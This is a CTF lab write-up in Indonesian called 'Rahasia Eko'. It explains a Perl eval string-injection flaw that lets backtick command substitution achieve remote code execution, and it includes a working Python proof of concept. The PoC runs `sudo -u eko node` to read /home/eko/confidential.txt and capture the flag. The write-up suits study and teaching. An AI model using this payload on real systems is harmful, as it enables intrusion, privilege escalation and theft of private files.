---
title: Rahasia Eko
description: Writeup lab Rahasia Eko
tags:
  - input injection
  - code injection
  - perl
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` String Injection (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[command-substitution]]

## Metodologi dan Observasi
1. Lab ini menggunakan *backend* skrip Perl kustom (`app.pl`) yang menyajikan peladen soket web sederhana (TCP 1337). Tujuan antarmukanya adalah merespon masukan melalui _query string_ `name`.
2. Jika kita melihat pada kode sumbernya, kerangka peladen mencantumkan modifikasi masukan pengguna menggunakan blok evaluasi `eval`:
   ```perl
   if ($name ne "") {
       $greeting = eval " '$greeting' . '$name' ";
   }
   ```
3. Titik penyisipan (*injection point*) terjadi karena variabel input `$name` ditempel langsung (*string concatenation* melalui titik `.`) tanpa metode pembersihan terstruktur ([[input-validation]]). 
4. Di dalam bahasa Perl (seperti halnya Bash, PHP, dan Ruby), kurung penutup berupa *backtick* (``` ` ```) adalah rujukan bagi lingkungan shell untuk memberikan pendelegasian operasional proses (*spawn shell command*) atau yang sering dinamakan teknik [[command-substitution]].
5. Karena string injeksi itu ditelan mentah-mentah oleh blok parameter `eval " ... "`, peretas sanggup menutup variabel string secara prematur, kemudian menempatkan sub-perintah _backtick_ tersebut di tengah susunan kode.
6. Hal ini menyebabkan mesin mengevaluasi injeksi yang pada gilirannya membuka celah [[code-injection]].

## PoC
Skrip pembuktian di bawah merakit sisipan *backtick* berisi utilitas *Node.js* (dijalankan dari OS target dengan previlese _user_ eko lewat perintah `sudo`) untuk mengekstraksi informasi _confidential_.

```python
import requests
import urllib.parse
import re

url = "http://localhost:1337"

# Kita menggunakan fungsi Node bawaan os untuk menaklukkan limitasi string
# sudo -u eko node -e "console.log(require('fs').readFileSync('/home/eko/confidential.txt', 'utf8'))"
cmd = "sudo -u eko node -e \"console.log(require('fs').readFileSync('/home/eko/confidential.txt', 'utf8'))\""

# Merangkai injeksi perl agar keluar dari tanda kutip
# Format payload yang tertelan menjadi: eval " 'Hello ' . ''.`cmd`.'' "
payload = f"'.`{cmd}`.'"
encoded_payload = urllib.parse.quote(payload)

# Meminta data dari rute REST API
target_url = f"{url}/api/greet?name={encoded_payload}"
res = requests.get(target_url)

if "pwn{" in res.text:
    match = re.search(r'pwn\{(.*)\}', res.text)
    if match:
        print(f"[+] Privesc ke eko berhasil! Flag ditemukan: {match.group(0)}")
```

## Impact
Mengizinkan input pihak luar dikelola menggunakan `eval` bahasa skrip merupakan _design flaw_ fatal tingkat tinggi. Eksploitasi injeksi substitusi perintah mendarat langsung pada kapabilitas [[remote-code-execution]] yang dapat merusak struktur basis eksekusi dan memutarbalikkan integritas privilese operasi file di latar belakang.
